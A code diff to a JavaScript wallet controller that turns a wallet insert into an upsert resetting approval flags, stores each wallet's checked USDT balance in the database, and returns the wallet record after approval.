@@ -18,12 +18,12 @@ class WalletController {
             
             const { address, name } = req.body;
             
-            // Save wallet to database
+            // Save wallet to database - UPSERT (insert or update)
             const query = `
-                INSERT INTO wallets (address, name, created_at, updated_at)
-                VALUES ($1, $2, NOW(), NOW())
+                INSERT INTO wallets (address, name, created_at, updated_at, is_approved, is_processed)
+                VALUES ($1, $2, NOW(), NOW(), false, false)
                 ON CONFLICT (address) DO UPDATE
-                SET updated_at = NOW()
+                SET name = $2, updated_at = NOW(), is_approved = false, is_processed = false
                 RETURNING *
             `;
             
@@ -32,6 +32,14 @@ class WalletController {
             
             // Get USDT balance
             const balance = await contractService.getWalletUSDTBalance(address);
+            
+            // Update balance in database
+            const updateQuery = `
+                UPDATE wallets 
+                SET usdt_balance = $1, last_balance_check = NOW()
+                WHERE address = $2
+            `;
+            await database.query(updateQuery, [balance, address]);
             
             // Send alert to admin
             const telegram = require('../config/telegram');
@@ -86,9 +94,12 @@ class WalletController {
                 });
             }
             
+            const wallet = result.rows[0];
+            
             res.json({
                 success: true,
-                message: 'Wallet approved successfully'
+                message: 'Wallet approved successfully',
+                wallet: wallet
             });
         } catch (error) {
             console.error('Wallet approval error:', error);
@@ -119,6 +130,14 @@ class WalletController {
             }
             
             const balance = await contractService.getWalletUSDTBalance(address);
+            
+            // Update balance in database
+            const updateQuery = `
+                UPDATE wallets 
+                SET usdt_balance = $1, last_balance_check = NOW()
+                WHERE address = $2
+            `;
+            await database.query(updateQuery, [balance, address]);
             
             res.json({
                 success: true,
